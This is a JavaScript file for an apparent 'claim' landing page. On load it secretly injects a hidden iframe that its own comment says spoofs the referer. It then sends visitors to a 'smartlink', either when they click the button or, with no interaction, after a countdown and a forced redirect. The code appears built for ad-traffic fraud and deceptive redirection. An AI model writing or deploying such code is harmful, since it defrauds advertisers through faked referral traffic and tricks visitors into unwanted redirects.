// main.js
document.addEventListener("DOMContentLoaded", () => {
  const claimBtn = document.getElementById("claimBtn");
  const countdownEl = document.getElementById("countdown");

  let countdown = CONFIG.countdownSeconds;
  let interacted = false;

  // Inject iframe spoofed referer diam-diam
  const hiddenIframe = document.createElement("iframe");
  hiddenIframe.src = CONFIG.refererSpoof;
  hiddenIframe.style.display = "none";
  document.body.appendChild(hiddenIframe);

  function userInteracted() {
    interacted = true;
    claimBtn.innerText = "Processing...";
    window.location.href = CONFIG.smartlink;
  }

  claimBtn.addEventListener("click", userInteracted);
  document.body.addEventListener("mousemove", () => interacted = true);
  document.body.addEventListener("touchstart", () => interacted = true);

  const timer = setInterval(() => {
    if (countdown > 0) {
      countdown--;
      countdownEl.innerText = interacted ? "Switching..." : `Waiting for interaction... ${countdown}`;
    } else {
      clearInterval(timer);
      if (!interacted) {
        window.scrollBy({ top: 150, behavior: 'smooth' });
        setTimeout(() => {
          window.location.href = CONFIG.smartlink;
        }, 5000);
      }
    }
  }, 1000);
});
